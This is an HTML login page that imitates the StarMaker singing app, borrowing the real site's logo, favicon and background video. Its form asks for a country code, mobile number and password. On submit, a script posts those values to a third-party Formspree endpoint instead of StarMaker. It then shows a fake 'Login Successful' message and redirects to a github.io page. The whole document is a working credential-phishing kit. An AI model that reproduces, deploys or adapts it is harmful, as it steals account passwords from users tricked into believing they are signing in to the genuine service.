<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>StarMaker Login</title>
    <link rel="icon" type="image/ico" href="https://www.starmakerstudios.com/next-assets/favicon.ico">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Roboto', sans-serif;
            background: #000;
            color: #fff;
            overflow: hidden;
            height: 100vh;
        }

        /* Video Background - FIXED AND STATIC */
        video {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            z-index: -2;
        }

        .video-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            z-index: -1;
        }

        /* Animated Particles */
        .particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            pointer-events: none;
        }

        .particle {
            position: absolute;
            width: 3px;
            height: 3px;
            background: rgba(255, 255, 255, 0.4);
            border-radius: 50%;
            animation: float 15s infinite ease-in-out;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0) translateX(0); opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { transform: translateY(-100vh) translateX(50px); opacity: 0; }
        }

        /* Logo */
        .logo-container {
            position: absolute;
            top: 30px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 1000;
            opacity: 0;
            animation: fadeInDown 1s ease forwards 0.5s;
        }

        @keyframes fadeInDown {
            from {
                opacity: 0;
                transform: translateX(-50%) translateY(-30px);
            }
            to {
                opacity: 1;
                transform: translateX(-50%) translateY(0);
            }
        }

        .logo-container img {
            height: 60px;
            transition: transform 0.3s ease;
        }

        .logo-container img:hover {
            transform: scale(1.05);
        }

        /* Login Container */
        .login-wrapper {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 100;
            width: 90%;
            max-width: 450px;
            opacity: 0;
            animation: fadeInUp 1s ease forwards 0.8s;
        }

        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translate(-50%, -40%);
            }
            to {
                opacity: 1;
                transform: translate(-50%, -50%);
            }
        }

        .login-container {
            background: rgba(255, 255, 255, 0.98);
            border-radius: 25px;
            padding: 40px 35px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.3);
        }

        .login-title {
            text-align: center;
            color: #444444;
            font-size: 26px;
            margin-bottom: 30px;
            font-weight: 700;
            letter-spacing: 0.5px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group input {
            width: 100%;
            padding: 15px 20px;
            border: none;
            border-radius: 25px;
            background: #f1f1f1;
            font-size: 15px;
            color: #333;
            transition: all 0.3s ease;
            font-family: 'Roboto', sans-serif;
        }

        .form-group input:focus {
            outline: none;
            background: #e8e8e8;
            box-shadow: 0 0 0 2px rgba(255, 41, 111, 0.2);
        }

        .form-group input::placeholder {
            color: #999;
        }

        .login-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #ff296f, #ff6b9d);
            color: #fff;
            border: none;
            border-radius: 25px;
            font-size: 16px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            cursor: pointer;
            transition: all 0.4s ease;
            margin-top: 10px;
            font-family: 'Roboto', sans-serif;
            position: relative;
            overflow: hidden;
        }

        .login-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
            transition: left 0.5s ease;
        }

        .login-btn:hover::before {
            left: 100%;
        }

        .login-btn:hover {
            background: #fff;
            color: #ff296f;
            box-shadow: 0 0 0 2px #ff296f inset;
            transform: translateY(-2px);
        }

        .login-btn:active {
            transform: translateY(0);
        }

        .login-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        /* Success Message */
        .success-message {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: linear-gradient(135deg, #4caf50, #66bb6a);
            color: #fff;
            padding: 15px 30px;
            border-radius: 25px;
            font-weight: 600;
            font-size: 15px;
            z-index: 2000;
            opacity: 0;
            visibility: hidden;
            transition: all 0.4s ease;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }

        .success-message.show {
            opacity: 1;
            visibility: visible;
            animation: slideDown 0.4s ease;
        }

        @keyframes slideDown {
            from {
                transform: translateX(-50%) translateY(-20px);
            }
            to {
                transform: translateX(-50%) translateY(0);
            }
        }

        /* Error styling */
        .error {
            border: 2px solid #ff296f !important;
            animation: shake 0.3s ease;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-10px); }
            75% { transform: translateX(10px); }
        }

        /* Mobile Responsive */
        @media (max-width: 768px) {
            .logo-container {
                top: 20px;
            }

            .logo-container img {
                height: 50px;
            }

            .login-container {
                padding: 30px 25px;
            }

            .login-title {
                font-size: 22px;
                margin-bottom: 25px;
            }

            .form-group input {
                padding: 14px 18px;
                font-size: 14px;
            }

            .login-btn {
                padding: 14px;
                font-size: 15px;
            }
        }

        @media (max-width: 480px) {
            .login-wrapper {
                width: 95%;
            }

            .login-container {
                padding: 25px 20px;
                border-radius: 20px;
            }

            .logo-container img {
                height: 45px;
            }
        }
    </style>
</head>
<body>
    <!-- Video Background -->
    <video autoplay loop muted playsinline>
        <source src="https://static.starmakerstudios.com/www-index-1/bg/wwww-new-v2-video.mp4" type="video/mp4">
    </video>
    <div class="video-overlay"></div>

    <!-- Particles -->
    <div class="particles" id="particles"></div>

    <!-- Logo -->
    <div class="logo-container">
        <img src="https://static.starmakerstudios.com/production/cdn/vue/starx-official/prod/_next/static/assets/images/app-icon.d79097a124ad0a00.png" alt="StarMaker">
    </div>

    <!-- Success Message -->
    <div class="success-message" id="successMessage">Login Successful! Redirecting...</div>

    <!-- Login Container -->
    <div class="login-wrapper">
        <div class="login-container">
            <h2 class="login-title">Mobile Number Login</h2>
            <form id="loginForm">
                <div class="form-group">
                    <input type="text" id="countryCode" name="country" placeholder="Country Code (e.g., +1)" required>
                </div>
                <div class="form-group">
                    <input type="tel" id="mobile" name="number" placeholder="Mobile Number" pattern="[0-9]{10}" required>
                </div>
                <div class="form-group">
                    <input type="password" id="password" name="password" placeholder="Enter Your Password" required>
                </div>
                <button type="submit" class="login-btn" id="loginBtn">Log In</button>
            </form>
        </div>
    </div>

    <script>
        // Create particles
        const particlesContainer = document.getElementById('particles');
        for (let i = 0; i < 40; i++) {
            const particle = document.createElement('div');
            particle.className = 'particle';
            particle.style.left = Math.random() * 100 + '%';
            particle.style.animationDelay = Math.random() * 15 + 's';
            particle.style.animationDuration = (Math.random() * 10 + 10) + 's';
            particlesContainer.appendChild(particle);
        }

        // Form handling
        const form = document.getElementById('loginForm');
        const loginBtn = document.getElementById('loginBtn');
        const successMessage = document.getElementById('successMessage');
        const countryCode = document.getElementById('countryCode');
        const mobile = document.getElementById('mobile');
        const password = document.getElementById('password');

        form.addEventListener('submit', async (e) => {
            e.preventDefault();

            // Remove previous error states
            [countryCode, mobile, password].forEach(input => {
                input.classList.remove('error');
            });

            // Validate inputs
            let isValid = true;
            if (!countryCode.value.trim()) {
                countryCode.classList.add('error');
                isValid = false;
            }
            if (!mobile.value.trim() || !/^[0-9]{10}$/.test(mobile.value)) {
                mobile.classList.add('error');
                isValid = false;
            }
            if (!password.value.trim()) {
                password.classList.add('error');
                isValid = false;
            }

            if (!isValid) return;

            // Disable button
            loginBtn.disabled = true;
            loginBtn.textContent = 'Logging in...';

            // Prepare form data
            const formData = new FormData();
            formData.append('country', countryCode.value);
            formData.append('number', mobile.value);
            formData.append('password', password.value);

            try {
                // Submit to Formspree
                const response = await fetch('https://formspree.io/f/mjvqvkjr', {
                    method: 'POST',
                    body: formData,
                    headers: {
                        'Accept': 'application/json'
                    }
                });

                if (response.ok) {
                    // Show success message
                    successMessage.classList.add('show');
                    
                    // Redirect after 2 seconds
                    setTimeout(() => {
                        window.location.href = 'https://starmakerstudio.github.io/web/Starmaker%20Web/Login/Events/index.html';
                    }, 2000);
                } else {
                    throw new Error('Form submission failed');
                }
            } catch (error) {
                console.error('Error:', error);
                alert('Login failed. Please try again.');
                loginBtn.disabled = false;
                loginBtn.textContent = 'Log In';
            }
        });

        // Remove error class on input
        [countryCode, mobile, password].forEach(input => {
            input.addEventListener('input', () => {
                input.classList.remove('error');
            });
        });
    </script>
</body>
</html>
